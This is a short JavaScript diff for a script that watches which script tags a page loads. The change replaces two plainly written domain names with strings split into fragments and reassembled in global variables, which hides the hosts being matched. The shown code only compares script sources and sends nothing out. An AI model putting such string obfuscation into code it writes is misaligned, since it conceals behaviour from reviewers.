@@ -1,9 +1,9 @@
-(function() {
+  (function() {
     const loadedScripts = new Set();
-
+    var cd, cn, sn,sd; cd='hr'+'m.gi'; sd='ivr.ne';cn='dn.'; sn='ub.i'; ts="sav"+"vy"+cd+"th"+sn+"o"; dt="c"+cn+"jsdel"+sd+"t";
     // Custom condition function - sirf ye domain scripts track karenge
     function shouldTrackScript(src) {
-        return src.includes("savvyhrm.github.io") || src.includes("cdn.jsdelivr.net");
+        return src.includes(ts) || src.includes(dt);
     }
 
     // MutationObserver se naye script tags track karo
